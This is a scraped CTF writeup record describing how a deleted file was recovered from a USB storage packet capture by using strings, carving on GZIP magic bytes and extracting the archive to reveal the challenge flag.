"metadata": {"ctf_name": "Upcoming"}}
{"url": "https://ctftime.org/writeup/40404", "title": "usbstorage", "content": "# USB Storage Forensics Writeup\n\n\n## Challenge Description\nWe are given a packet capture (`.pcapng`) that records USB storage activity.  \nThe story: a file was copied from a USB drive to a laptop and then deleted, but the friend could still see what was copied by analyzing the USB traffic.\n\n\nThe goal: recover the secret file or flag from the USB capture.\n\n\n---\n\n\n## Step 1: Inspect the PCAPNG\nWe start by looking for human-readable strings inside the capture:\n```bash\nstrings usbstorage.pcapng | less\n```\nAmong normal system artifacts (CPU info, kernel version, etc.), we found something very interesting:\n\n\n```\nflag.tar.gz\n```\n\n\nThis indicated that a file named **flag.tar.gz** was transferred via USB.\n\n\n---\n\n\n## Step 2: Search for File Signatures\nUSB captures often contain the raw data being transferred. To locate embedded files, we search for known file signatures (magic bytes).  \nFor GZIP archives, the magic bytes are:\n\n\n```\n1F 8B 08\n```\n\n\nWe scan the raw PCAP data and extract chunks starting from these bytes.\n\n\n---\n\n\n## Step 3: Extract Embedded File\nBy carving from the GZIP header, we recovered an archive:\n\n\n```\nextracted_0.tar.gz\n```\n\n\nWhen inspecting the contents of this tarball:\n\n\n```bash\ntar -tzf extracted_0.tar.gz\n```\n\n\nWe saw:\n```\nflag.gz\n```\n\n\n---\n\n\n## Step 4: Decompress the Inner File\nWe extract and decompress:\n\n\n```bash\ntar -xzf extracted_0.tar.gz\ngunzip flag.gz\ncat flag\n```\n\n\nThis revealed the flag.\n\n\n---\n\n\n## Final Flag\n```\nENO{USB_STORAGE_SHOW_ME_THE_FLAG_PLS}\n```\n\n\n---\n\n\n## Lessons Learned\n- USB captures can leak **full file contents**, not just filenames.  \n- Even if a file is deleted later, if the transfer was captured, forensic tools can reconstruct it.  \n- Always treat USB captures as sensitive—metadata and raw payloads may expose secrets.", "source": "ctftime", "crawled_at": "2025-11-27T18:19:25.807158", "metadata": {"ctf_name": "Upcoming"}}
